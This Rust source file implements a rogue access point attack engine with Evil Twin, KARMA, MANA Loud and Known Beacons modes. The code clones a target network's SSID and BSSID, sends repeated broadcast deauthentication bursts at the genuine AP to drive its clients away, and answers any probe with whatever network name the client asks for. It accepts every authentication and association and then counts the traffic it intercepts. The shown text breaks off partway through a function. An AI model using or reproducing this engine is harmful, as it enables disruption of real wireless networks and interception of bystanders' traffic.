//! Rogue AP / Evil Twin / KARMA / MANA Loud / Known Beacons engine.
//!
//! Complete AP mode: beacon loop, RX handler, client tracking, KARMA SSID
//! collection, MANA loud, known beacons, probe response injection, deauth
//! loop for evil twin, data frame interception.
//!
//! Attack modes:
//!   **EvilTwin** — Clone target SSID+BSSID as open network, deauth real AP
//!   **Karma** — Respond to ALL probe requests with matching SSID
//!   **ManaLoud** — Enhanced KARMA: broadcast observed SSIDs as beacons
//!   **KnownBeacons** — Broadcast thousands of common SSIDs to trigger auto-connect
//!   **Normal** — Simple open AP with a fixed SSID
//!
//! Architecture (SharedAdapter):
//!   The attack runs a unified TX+RX loop on its own thread. Beacons are
//!   transmitted at configurable intervals. Incoming frames are dispatched:
//!   probe requests → probe response (KARMA: respond to ALL), auth requests →
//!   auth response (accept all), assoc requests → assoc response + track client.
//!   Evil Twin mode adds deauth bursts against the original AP.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_ap.c` (996 lines).

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::core::{EventRing, MacAddress, TxFlags, TxOptions, TxRate};
use crate::store::Ap;
use crate::protocol::frames;
use crate::protocol::ie::{self, ApSecurity, BeaconIeConfig};
use crate::protocol::ieee80211::{self, auth_algo, cap_info, fc_flags};

// ═══════════════════════════════════════════════════════════════════════════════
//  AP Attack Mode
// ═══════════════════════════════════════════════════════════════════════════════

/// The 5 rogue AP attack modes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApMode {
    /// Simple open AP with a fixed SSID. Clients can connect freely.
    Normal,
    /// Clone target SSID+BSSID as open network, deauth real AP to steal clients.
    EvilTwin,
    /// Respond to ALL probe requests with matching SSID. Catch any device
    /// looking for a known network.
    Karma,
    /// Enhanced KARMA: additionally broadcast all observed SSIDs as beacons.
    /// Much more aggressive — clients see their preferred networks appear.
    ManaLoud,
    /// Broadcast thousands of common SSIDs (from a wordlist) to trigger
    /// auto-connect on devices with saved networks. Like mdk4.
    KnownBeacons,
}

impl ApMode {
    pub fn name(&self) -> &'static str {
        match self {
            Self::Normal => "Normal",
            Self::EvilTwin => "Evil Twin",
            Self::Karma => "KARMA",
            Self::ManaLoud => "MANA Loud",
            Self::KnownBeacons => "Known Beacons",
        }
    }

    pub fn short_name(&self) -> &'static str {
        match self {
            Self::Normal => "normal",
            Self::EvilTwin => "evil-twin",
            Self::Karma => "karma",
            Self::ManaLoud => "mana",
            Self::KnownBeacons => "known-beacons",
        }
    }

    /// Whether this mode responds to all probe requests regardless of SSID.
    fn is_karma_mode(&self) -> bool {
        matches!(self, Self::Karma | Self::ManaLoud)
    }

    /// Whether this mode deauths the original AP.
    fn deauths_original(&self) -> bool {
        matches!(self, Self::EvilTwin)
    }
}

impl std::fmt::Display for ApMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AP Attack Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Configuration for the rogue AP attack.
///
/// Targets come from the scanner's Ap struct passed to start(), NOT from here.
/// This struct holds only behavior configuration.
#[derive(Debug, Clone)]
pub struct ApParams {
    // === Mode ===
    /// Which AP mode to run. Default: EvilTwin.
    pub mode: ApMode,

    // === Identity ===
    /// SSID for our rogue AP. If None, clones the target AP's SSID.
    pub ssid: Option<String>,
    /// BSSID for our rogue AP. None = clone target or use adapter MAC.
    pub our_bssid: Option<MacAddress>,
    /// Security for our rogue AP. Default: Open (no encryption).
    pub security: ApSecurity,

    // === Beacon ===
    /// Beacon interval in TUs (1 TU = 1.024ms). Default: 100.
    pub beacon_interval: u16,
    /// Hide the SSID in beacons (zero-length SSID). Default: false.
    pub hidden_ssid: bool,

    // === Evil Twin ===
    /// Deauth the real AP to steal clients. Default: true (when EvilTwin mode).
    pub deauth_original: bool,
    /// Number of deauth frames per burst. Default: 5.
    pub deauth_count: u32,
    /// Interval between deauth bursts. Default: 500ms.
    pub deauth_interval: Duration,

    // === Known Beacons ===
    /// List of SSIDs to broadcast in KnownBeacons mode.
    pub beacon_list: Vec<String>,

    // === MANA Loud ===
    /// Delay between MANA beacon rotations. Default: 5ms.
    pub mana_beacon_delay: Duration,

    // === Timing ===
    /// Overall attack timeout (0 = run until stopped). Default: 0.
    pub timeout: Duration,
    /// Wait after channel lock. Default: 50ms.
    pub channel_settle: Duration,
    /// RX poll timeout. Default: 10ms.
    pub rx_poll_timeout: Duration,

    // === Limits ===
    /// Maximum clients to track. Default: 128.
    pub max_clients: u32,
    /// Maximum KARMA SSIDs to collect. Default: 256.
    pub max_karma_ssids: u32,
}

impl Default for ApParams {
    fn default() -> Self {
        Self {
            mode: ApMode::EvilTwin,
            ssid: None,
            our_bssid: None,
            security: ApSecurity::Open,
            beacon_interval: 100,
            hidden_ssid: false,
            deauth_original: true,
            deauth_count: 5,
            deauth_interval: Duration::from_millis(500),
            beacon_list: Vec::new(),
            mana_beacon_delay: Duration::from_millis(5),
            timeout: Duration::ZERO,
            channel_settle: Duration::from_millis(50),
            rx_poll_timeout: Duration::from_millis(10),
            max_clients: 128,
            max_karma_ssids: 256,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AP Attack Phase
// ═══════════════════════════════════════════════════════════════════════════════

/// Current phase of the rogue AP attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApPhase {
    /// Not started.
    Idle,
    /// Setting up channel lock and AP IEs.
    Starting,
    /// Beacon TX + RX loop active, waiting for clients.
    Broadcasting,
    /// Clients connected, actively serving.
    Active,
    /// Attack done.
    Done,
}

impl Default for ApPhase {
    fn default() -> Self {
        Self::Idle
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Client tracking — per-client state
// ═══════════════════════════════════════════════════════════════════════════════

/// State of a client in our AP.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClientApState {
    /// Client sent a probe request (seen but not connected).
    Probed,
    /// Client sent auth request, we accepted.
    Authenticated,
    /// Client associated — fully connected.
    Associated,
    /// Client sent deauth/disassoc — disconnected.
    Disconnected,
}

/// Tracked rogue AP client.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct ApClient {
    /// Client MAC address.
    pub mac: MacAddress,
    /// Current state.
    pub state: ClientApState,
    /// RSSI of last frame.
    pub rssi: i8,
    /// Association ID.
    pub aid: u16,
    /// SSID from probe request (what they were looking for).
    pub probe_ssid: String,
    /// Number of probe requests from this client.
    pub probe_count: u32,
    /// Number of auth requests.
    pub auth_count: u32,
    /// Number of association requests.
    pub assoc_count: u32,
    /// Data frames received from this client.
    pub data_frames_rx: u64,
    /// Bytes received from this client.
    pub bytes_rx: u64,
    /// First seen timestamp (since attack start).
    pub first_seen: Duration,
    /// Last seen timestamp (since attack start).
    pub last_seen: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AP Attack Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Real-time info snapshot for the CLI renderer.
#[derive(Debug, Clone)]
pub struct ApInfo {
    // === State ===
    pub phase: ApPhase,
    pub running: bool,
    pub mode: ApMode,

    // === Identity ===
    pub ssid: String,
    pub our_bssid: MacAddress,
    pub channel: u8,
    pub target_bssid: Option<MacAddress>,

    // === Client tracking ===
    pub clients_connected: u32,
    pub clients_total: u32,
    /// Top clients for live display (capped at MAX_DISPLAY_CLIENTS).
    pub clients: Vec<ApClient>,

    // === KARMA ===
    pub karma_ssids_collected: u32,
    /// Recent KARMA SSIDs for display (capped).
    pub karma_ssids: Vec<String>,

    // === AP counters ===
    pub beacons_sent: u64,
    pub probes_received: u64,
    pub probes_answered: u64,
    pub auths_received: u64,
    pub auths_accepted: u64,
    pub assocs_received: u64,
    pub assocs_accepted: u64,
    pub deauths_sent: u64,
    pub deauths_received: u64,

    // === Traffic ===
    pub data_frames_rx: u64,
    pub bytes_rx: u64,

    // === Frame counters ===
    pub frames_sent: u64,
    pub frames_received: u64,

    // === TX Feedback (ACK/NACK from firmware) ===
    pub tx_feedback: crate::core::TxFeedbackSnapshot,

    // === Timing ===
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,
}

impl Default for ApInfo {
    fn default() -> Self {
        Self {
            phase: ApPhase::Idle,
            running: false,
            mode: ApMode::EvilTwin,
            ssid: String::new(),
            our_bssid: MacAddress::ZERO,
            channel: 0,
            target_bssid: None,
            clients_connected: 0,
            clients_total: 0,
            clients: Vec::new(),
            karma_ssids_collected: 0,
            karma_ssids: Vec::new(),
            beacons_sent: 0,
            probes_received: 0,
            probes_answered: 0,
            auths_received: 0,
            auths_accepted: 0,
            assocs_received: 0,
            assocs_accepted: 0,
            deauths_sent: 0,
            deauths_received: 0,
            data_frames_rx: 0,
            bytes_rx: 0,
            frames_sent: 0,
            frames_received: 0,
            tx_feedback: Default::default(),
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
        }
    }
}

/// Max clients to include in ApInfo for live display.
const MAX_DISPLAY_CLIENTS: usize = 32;
/// Max KARMA SSIDs to include in ApInfo for live display.
const MAX_DISPLAY_KARMA_SSIDS: usize = 32;

// ═══════════════════════════════════════════════════════════════════════════════
//  AP Attack Result — per-run result and final aggregate
// ═══════════════════════════════════════════════════════════════════════════════

/// Result for a single AP attack run.
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct ApResult {
    /// Attack mode that was used.
    pub mode: ApMode,
    /// SSID of the rogue AP.
    pub ssid: String,
    /// Channel used.
    pub channel: u8,
    /// Number of clients that connected.
    pub clients_connected: u32,
    /// Number of credentials captured (for future credential-capture modes).
    pub credentials_captured: u32,
    /// Total elapsed time.
    pub elapsed: Duration,
}

/// Aggregate result produced when the AP attack completes.
#[derive(Debug, Clone, Default)]
#[allow(dead_code)]
pub struct ApFinalResult {
    /// Per-run results (currently one, but supports multi-run).
    pub results: Vec<ApResult>,
    /// Total clients across all runs.
    pub total_clients: u32,
    /// Total credentials across all runs.
    pub total_credentials: u32,
    /// Total elapsed time.
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AP Attack Events — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event during the AP attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct ApEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: ApEventKind,
}

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum ApEventKind {
    /// Channel locked for rogue AP.
    ChannelLocked { channel: u8 },
    /// Rogue AP started broadcasting beacons.
    ApStarted { bssid: MacAddress, ssid: String, mode: ApMode },
    /// Probe request received from a client.
    ProbeRequest { mac: MacAddress, ssid: String, rssi: i8 },
    /// Probe response sent to a client.
    ProbeResponse { mac: MacAddress, ssid: String },
    /// New SSID collected by KARMA.
    KarmaSsidCollected { ssid: String, mac: MacAddress, total: u32 },
    /// Client authenticated (Open System).
    ClientAuthenticated { mac: MacAddress, rssi: i8 },
    /// Client associated — fully connected to our AP.
    ClientAssociated { mac: MacAddress, aid: u16, rssi: i8 },
    /// Client reassociated.
    ClientReassociated { mac: MacAddress, aid: u16 },
    /// Client disconnected (deauth/disassoc from client).
    ClientDisconnected { mac: MacAddress, reason: u16 },
    /// Deauth burst sent to original AP (Evil Twin).
    DeauthBurst { target_bssid: MacAddress, count: u32 },
    /// Data frame received from a connected client.
    DataFrameReceived { mac: MacAddress, bytes: u32 },
    /// Overall timeout reached.
    TimeoutReached { elapsed: Duration },
    /// Attack complete.
    AttackComplete {
        clients_total: u32,
        karma_ssids: u32,
        elapsed: Duration,
    },
    /// Non-fatal error.
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ApAttack — the attack engine
// ═══════════════════════════════════════════════════════════════════════════════

/// Rogue AP attack engine.
pub struct ApAttack {
    params: ApParams,
    info: Arc<Mutex<ApInfo>>,
    events: Arc<EventRing<ApEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
}

impl ApAttack {
    pub fn new(params: ApParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(ApInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start the AP attack on a background thread.
    ///
    /// `target` is the AP to clone/attack (for Evil Twin) or None (for KARMA/Normal).
    pub fn start(&self, shared: SharedAdapter, target: Option<Ap>) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.running = true;
            i.start_time = Instant::now();
            i.mode = params.mode;
            i.phase = ApPhase::Starting;
            if let Some(ref t) = target {
                i.target_bssid = Some(t.bssid);
                i.channel = t.channel;
                i.ssid = params.ssid.clone().unwrap_or_else(|| t.ssid.clone());
            } else {
                i.ssid = params.ssid.clone().unwrap_or_else(|| "FreeWiFi".to_string());
            }
        }

        thread::Builder::new()
            .name("ap".into())
            .spawn(move || {
                let reader = shared.subscribe("ap");
                run_ap_attack(&shared, &reader, target.as_ref(), &params, &info, &events, &running);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                    i.running = false;
                    i.phase = ApPhase::Done;
                }
            })
            .expect("failed to spawn ap thread");
    }

    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    pub fn info(&self) -> ApInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    pub fn events(&self) -> Vec<ApEvent> {
        self.events.drain()
    }

    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "ap"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic — runs on its own thread
// ═══════════════════════════════════════════════════════════════════════════════

fn run_ap_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: Option<&Ap>,
    params: &ApParams,
    info: &Arc<Mutex<ApInfo>>,
    events: &Arc<EventRing<ApEvent>>,
    running: &Arc<AtomicBool>,
) {
    let start = Instant::now();
    let tx_fb = shared.tx_feedback();
    tx_fb.reset();

    // === Determine our AP identity ===
    let ssid = params.ssid.clone().unwrap_or_else(|| {
        target.map(|t| t.ssid.clone()).unwrap_or_else(|| "FreeWiFi".to_string())
    });
    let channel = target.map(|t| t.channel).unwrap_or(6);
    let target_bssid = target.map(|t| t.bssid);
    // TX options optimized for range — own MAC so ACK feedback works
    let tx_opts = TxOptions {
        rate: if channel <= 14 { TxRate::Cck1m } else { TxRate::Ofdm6m },
        retries: 12,
        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
        ..Default::default()
    };

    let our_bssid = if let Some(bssid) = params.our_bssid {
        bssid
    } else if params.mode == ApMode::EvilTwin {
        // Clone target BSSID for evil twin
        target_bssid.unwrap_or_else(|| {
            let mac = shared.mac();
            let mut bytes = *mac.as_bytes();
            bytes[0] |= 0x02; // locally administered
            MacAddress::new(bytes)
        })
    } else {
        // Generate locally-administered MAC
        let mac = shared.mac();
        let mut bytes = *mac.as_bytes();
        bytes[0] |= 0x02; // locally administered
        MacAddress::new(bytes)
    };

    {
        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.our_bssid = our_bssid;
        i.target_bssid = target_bssid;
        i.ssid = ssid.clone();
        i.channel = channel;
    }

    // === Lock channel ===
    if let Err(e) = shared.lock_channel(channel, "ap") {
        push_event(events, start, ApEventKind::Error {
            message: format!("Channel lock failed: {}", e),
        });
        return;
    }
    push_event(events, start, ApEventKind::ChannelLocked { channel });
    if params.channel_settle > Duration::ZERO {
        thread::sleep(params.channel_settle);
    }

    // === Pre-build beacon IEs ===
    let beacon_ie_config = BeaconIeConfig {
        ssid: ssid.as_bytes().to_vec(),
        channel,
        security: params.security,
        hidden_ssid: params.hidden_ssid,
        country_code: *b"XX",
    };
    let beacon_ies = ie::build_beacon_ies(&beacon_ie_config, true);
    let probe_ies = ie::build_beacon_ies(&beacon_ie_config, false);
    let cap = if params.security == ApSecurity::Open {
        cap_info::BASE
    } else {
        cap_info::BASE | cap_info::PRIVACY
    };

    // Assoc response IEs
    let assoc_resp_ies = {
        let mut ies = Vec::with_capacity(64);
        ies.extend(ie::build_rates(channel > 14));
        ies.extend(ie::build_ht_caps(2));
        ies
    };

    set_phase(info, ApPhase::Broadcasting);
    push_event(events, start, ApEventKind::ApStarted {
        bssid: our_bssid,
        ssid: ssid.clone(),
        mode: params.mode,
    });

    if !running.load(Ordering::SeqCst) {
        shared.unlock_channel();
        return;
    }

    // === State ===
    let mut clients: HashMap<[u8; 6], ApClient> = HashMap::new();
    let mut karma_ssids: Vec<String> = Vec::new();
    let mut next_aid: u16 = 1;
    let mut last_beacon = Instant::now() - Duration::from_secs(1); // force immediate
    let mut last_deauth = Instant::now() - Duration::from_secs(10);
    #[allow(unused_assignments)]
    let mut tsf: u64 = 0;
    let _seq_num: u16 = 0;
    let mut frames_sent: u64 = 0;
    let mut frames_received: u64 = 0;
    let mut beacons_sent: u64 = 0;
    let mut deauths_sent: u64 = 0;
    let mut probes_received: u64 = 0;
    let mut probes_answered: u64 = 0;
    let mut auths_received: u64 = 0;
    let mut auths_accepted: u64 = 0;
    let mut assocs_received: u64 = 0;
    let mut assocs_accepted: u64 = 0;
    let mut deauths_received: u64 = 0;
    let mut data_frames_rx: u64 = 0;
    let mut bytes_rx: u64 = 0;
    let mut beacon_list_idx: usize = 0;

    let beacon_interval_dur = Duration::from_micros(params.beacon_interval as u64 * 1024);

    // === Main loop: beacon TX + RX dispatch ===
    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        let elapsed = now.duration_since(start);

        // --- Check overall timeout ---
        if params.timeout > Duration::ZERO && elapsed >= params.timeout {
            push_event(events, start, ApEventKind::TimeoutReached { elapsed });
            break;
        }

        // --- Beacon TX (mode-dependent) ---
        if now.duration_since(last_beacon) >= beacon_interval_dur {
            tsf = elapsed.as_micros() as u64;

            match params.mode {
                ApMode::KnownBeacons if !params.beacon_list.is_empty() => {
                    // Rotate through the beacon list, one SSID per interval
                    let ssid_for_beacon = &params.beacon_list[beacon_list_idx % params.beacon_list.len()];
                    beacon_list_idx += 1;

                    // Generate per-SSID BSSID (locally administered + index)
                    let mut kb_bytes = *our_bssid.as_bytes();
                    kb_bytes[0] |= 0x02;
                    kb_bytes[5] = kb_bytes[5].wrapping_add((beacon_list_idx & 0xFF) as u8);
                    let kb_bssid = MacAddress::new(kb_bytes);

                    let kb_ie_config = BeaconIeConfig {
                        ssid: ssid_for_beacon.as_bytes().to_vec(),
                        channel,
                        security: ApSecurity::Open,
                        hidden_ssid: false,
                        country_code: *b"XX",
                    };
                    let kb_ies = ie::build_beacon_ies(&kb_ie_config, true);
                    if let Some(beacon) = frames::build_beacon(
                        &kb_bssid, tsf, params.beacon_interval, cap, &kb_ies,
                    ) {
                        let _ = shared.tx_frame(&beacon, &tx_opts);
                        frames_sent += 1;
                        beacons_sent += 1;
                    }
                }
                ApMode::ManaLoud => {
                    // Send our primary beacon
                    if let Some(beacon) = frames::build_beacon(
                        &our_bssid, tsf, params.beacon_interval, cap, &beacon_ies,
                    ) {
                        let _ = shared.tx_frame(&beacon, &tx_opts);
                        frames_sent += 1;
                        beacons_sent += 1;
                    }
                    // Also broadcast all collected KARMA SSIDs
                    for karma_ssid in &karma_ssids {
                        if !running.load(Ordering::SeqCst) { break; }
                        let karma_ie_config = BeaconIeConfig {
                            ssid: karma_ssid.as_bytes().to_vec(),
                            channel,
                            security: ApSecurity::Open,
                            hidden_ssid: false,
                            country_code: *b"XX",
                        };
                        let karma_ies = ie::build_beacon_ies(&karma_ie_config, true);
                        if let Some(beacon) = frames::build_beacon(
                            &our_bssid, tsf, params.beacon_interval, cap, &karma_ies,
                        ) {
                            let _ = shared.tx_frame(&beacon, &tx_opts);
                            frames_sent += 1;
                            beacons_sent += 1;
                        }
                        thread::sleep(params.mana_beacon_delay);
                    }
                }
                _ => {
                    // Normal / Evil Twin / KARMA — send our beacon
                    if let Some(beacon) = frames::build_beacon(
                        &our_bssid, tsf, params.beacon_interval, cap, &beacon_ies,
                    ) {
                        let _ = shared.tx_frame(&beacon, &tx_opts);
                        frames_sent += 1;
                        beacons_sent += 1;
                    }
                }
            }
            last_beacon = now;
        }

        // --- Deauth original AP (Evil Twin) ---
        if params.mode.deauths_original() && params.deauth_original {
            if let Some(tb) = target_bssid {
                if now.duration_since(last_deauth) >= params.deauth_interval {
                    for _ in 0..params.deauth_count {
                        let deauth = frames::build_deauth(
                            &tb,
                            &MacAddress::BROADCAST,
                            &tb,
                            ieee80211::ReasonCode::Class3FromNonAssoc,
                        );
                        let _ = shared.tx_frame(&deauth, &tx_opts);
                        frames_sent += 1;
                        deauths_sent += 1;
                    }
                    push_event(events, start, ApEventKind::DeauthBurst {
                        target_bssid: tb,
                        count: params.deauth_count,
                    });
                    last_deauth = now;
                }
            }
        }

        // --- RX frame processing ---
        match reader.recv_timeout(params.rx_poll_timeout) {
            Some(frame) => {
                frames_received += 1;
                if frame.raw.len() < 24 { continue; }

                let fc0 = frame.raw[0];
                let fc1 = frame.raw[1];
                let frame_type = (fc0 >> 2) & 0x03;
                let frame_subtype = (fc0 >> 4) & 0x0F;

                match frame_type {
                    // === Management frames ===
                    0 => {
                        let addr1 = &frame.raw[4..10];
                        // Accept frames addressed to us or broadcast
                        if addr1 != our_bssid.as_bytes() && addr1 != MacAddress::BROADCAST.as_bytes() {
                            // For probe requests, check regardless (KARMA responds to all)
                            if frame_subtype != 4 {
                                continue;
                            }
                        }

                        let sta_mac_bytes: [u8; 6] = frame.raw[10..16].try_into().unwrap_or([0; 6]);
                        let sta_mac = MacAddress::new(sta_mac_bytes);

                        match frame_subtype {
                            // --- Probe Request (subtype 4) ---
                            4 => {
                                probes_received += 1;
                                let req_ssid = extract_ssid_from_probe(&frame.raw);

                                // Track client
                                get_or_create_client(
                                    &mut clients, &sta_mac, params.max_clients,
                                    elapsed, frame.rssi,
                                );
                                if let Some(c) = clients.get_mut(&sta_mac_bytes) {
                                    c.probe_count += 1;
                                    if c.probe_ssid.is_empty() && !req_ssid.is_empty() {
                                        c.probe_ssid = req_ssid.clone();
                                    }
                                    if c.state == ClientApState::Disconnected {
                                        c.state = ClientApState::Probed;
                                    }
                                }

                                push_event(events, start, ApEventKind::ProbeRequest {
                                    mac: sta_mac, ssid: req_ssid.clone(), rssi: frame.rssi,
                                });

                                // Determine if we should respond
                                let should_respond = if params.mode.is_karma_mode() {
                                    // KARMA: respond to ALL probes
                                    if !req_ssid.is_empty() {
                                        let is_new = !karma_ssids.contains(&req_ssid);
                                        if is_new && (karma_ssids.len() as u32) < params.max_karma_ssids {
                                            karma_ssids.push(req_ssid.clone());
                                            push_event(events, start, ApEventKind::KarmaSsidCollected {
                                                ssid: req_ssid.clone(),
                                                mac: sta_mac,
                                                total: karma_ssids.len() as u32,
                                            });
                                        }
                                    }
                                    true
                                } else {
                                    // Normal/EvilTwin: respond to matching or broadcast
                                    req_ssid.is_empty() || req_ssid == ssid
                                };

                                if should_respond {
                                    // KARMA mode: respond with the SSID the client asked for
                                    let resp_ssid = if params.mode.is_karma_mode() && !req_ssid.is_empty() {
                                        &req_ssid
                                    } else {
                                        &ssid
                                    };

                                    // Build probe response IEs with the response SSID
                                    let resp_probe_ies = if resp_ssid != &ssid {
                                        let resp_ie_config = BeaconIeConfig {
                                            ssid: resp_ssid.as_bytes().to_vec(),
                                            channel,
                                            security: params.security,
                                            hidden_ssid: false,
                                            country_code: *b"XX",
                                        };
                                        ie::build_beacon_ies(&resp_ie_config, false)
                                    } else {
                                        probe_ies.clone()
                                    };

                                    if let Some(probe_resp) = frames::build_probe_response(
                                        &our_bssid, &sta_mac,
                                        elapsed.as_micros() as u64,
                                        params.beacon_interval, cap, &resp_probe_ies,
                                    ) {
                                        let _ = shared.tx_frame(&probe_resp, &tx_opts);
                                        frames_sent += 1;
                                        probes_answered += 1;
                                    }

                                    push_event(events, start, ApEventKind::ProbeResponse {
                                        mac: sta_mac, ssid: resp_ssid.clone(),
                                    });
                                }
                            }

                            // --- Auth Request (subtype 11) ---
                            11 => {
                                // Check BSSID matches us
                                let frame_bssid = &frame.raw[16..22];
                                if frame_bssid != our_bssid.as_bytes() { continue; }

                                auths_received += 1;

                                // Auth algo from pre-parsed frame
                                let algo = match &frame.body {
                                    crate::core::parsed_frame::FrameBody::Auth { algorithm, .. } => *algorithm,
                                    _ => auth_algo::OPEN_SYSTEM,
                                };

                                // Track client
                                get_or_create_client(
                                    &mut clients, &sta_mac, params.max_clients,
                                    elapsed, frame.rssi,
                                );
                                if let Some(c) = clients.get_mut(&sta_mac_bytes) {
                                    c.auth_count += 1;
                                    c.state = ClientApState::Authenticated;
                                }

                                // Accept all auth requests
                                let auth_resp = frames::build_auth_response(
                                    &sta_mac, &our_bssid,
                                    algo, ieee80211::StatusCode::Success,
                                );
                                let _ = shared.tx_frame(&auth_resp, &tx_opts);
                                frames_sent += 1;
                                auths_accepted += 1;

                                push_event(events, start, ApEventKind::ClientAuthenticated {
                                    mac: sta_mac, rssi: frame.rssi,
                                });
                            }

                            // --- Assoc Request (subtype 0) or Reassoc (subtype 2) ---
                            0 | 2 => {
                                let frame_bssid = &frame.raw[16..22];
                                if frame_bssid != our_bssid.as_bytes() { continue; }

                                assocs_received += 1;
                                let is_reassoc = frame_subtype == 2;

                                // Assign AID
                                let aid = get_or_create_client(
                                    &mut clients, &sta_mac, params.max_clients,
                                    elapsed, frame.rssi,
                                ).map(|_| {
                                    let c = clients.get_mut(&sta_mac_bytes).unwrap();
                                    if c.aid == 0 {
                                        c.aid = next_aid;
                                        next_aid = next_aid.wrapping_add(1).max(1);
                                    }
                                    c.state = ClientApState::Associated;
                                    c.assoc_count += 1;
                                    c.aid
                                }).unwrap_or(0);

                                if aid == 0 { continue; }

                                // Send assoc response
                                if let Some(assoc_resp) = frames::build_assoc_response(
                                    &sta_mac, &our_bssid,
                                    ieee80211::StatusCode::Success,
                                    aid, cap, &assoc_resp_ies,
                                ) {
                                    let _ = shared.tx_frame(&assoc_resp, &tx_opts);
                                    frames_sent += 1;
                                    assocs_accepted += 1;
                                }

                                // Update phase
                                set_phase(info, ApPhase::Active);

                                if is_reassoc {
                                    push_event(events, start, ApEventKind::ClientReassociated {
                                        mac: sta_mac, aid,
                                    });
                                } else {
                                    push_event(events, start, ApEventKind::ClientAssociated {
                                        mac: sta_mac, aid, rssi: frame.rssi,
                                    });
                                }
                            }

                            // --- Deauthentication (subtype 12) ---
                            12 => {
                                let frame_bssid = &frame.raw[16..22];
                                if frame_bssid != our_bssid.as_bytes() { continue; }

                                deauths_received += 1;
                                let reason = if frame.raw.len() >= 26 {
                                    u16::from_le_bytes([frame.raw[24], frame.raw[25]])
                                } else { 0 };

                                if let Some(c) = clients.get_mut(&sta_mac_bytes) {
                                    if c.state == ClientApState::Associated {
                                        c.state = ClientApState::Disconnected;
                                    }
                                }

                                push_event(events, start, ApEventKind::ClientDisconnected {
                                    mac: sta_mac, reason,
                                });
                            }

                            // --- Disassociation (subtype 10) ---
                            10 => {
                                let frame_bssid = &frame.raw[16..22];
                                if frame_bssid != our_bssid.as_bytes() { continue; }

                                if let Some(c) = clients.get_mut(&sta_mac_bytes) {
                                    if c.state == ClientApState::Associated {
                                        c.state = ClientApState::Disconnected;
                                    }
                                }
                            }

                            _ => {} // Ignore other management subtypes
                        }
                    }

                    // === Data frames ===
                    2 => {
                        // Check if ToDS (client → our AP)
                        let to_ds = fc1 & fc_flags::TO_DS != 0;
                        if !to_ds { continue; }

                        let addr1 = &frame.raw[4..10];
                        if addr1 != our_bssid.as_bytes() { continue; }

                        let sta_mac_bytes: [u8; 6] = frame.raw[10..16].try_into().unwrap_or([0; 6]);
                        let _sta_mac = MacAddress::new(sta_mac_bytes);

                        data_frames_rx += 1;
                        bytes_rx += frame.raw.len() as u64;

                        if let Some(c) = clients.get_mut(&sta_mac_bytes) {
                            c.data_frames_rx += 1;
                            c.bytes_rx += frame.raw.len() as u64;
                            c.rssi = frame.rssi;
                            c.last_seen = elapsed;
                        }
                    }

                    _ => {} // Control frames — ignore
                }
            }
            None => {} // No frame
        }

        // --- Update info snapshot ---
        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.elapsed = start.elapsed();
            i.frames_sent = frames_sent;
            i.frames_received = frames_received;
            i.beacons_sent = beacons_sent;
            i.probes_received = probes_received;
            i.probes_answered = probes_answered;
            i.auths_received = auths_received;
            i.auths_accepted = auths_accepted;
            i.assocs_received = assocs_received;
            i.assocs_accepted = assocs_accepted;
            i.deauths_sent = deauths_sent;
            i.deauths_received = deauths_received;
            i.data_frames_rx = data_frames_rx;
            i.bytes_rx = bytes_rx;
            i.karma_ssids_collected = karma_ssids.len() as u32;

            // Client snapshot
            i.clients_total = clients.len() as u32;
            i.clients_connected = clients.values()
                .filter(|c| c.state == ClientApState::Associated)
                .count() as u32;

            // Copy top clients for display (sorted by last_seen, most recent first)
            let mut sorted_clients: Vec<&ApClient> = clients.values().collect();
            sorted_clients.sort_by(|a, b| b.last_seen.cmp(&a.last_seen));
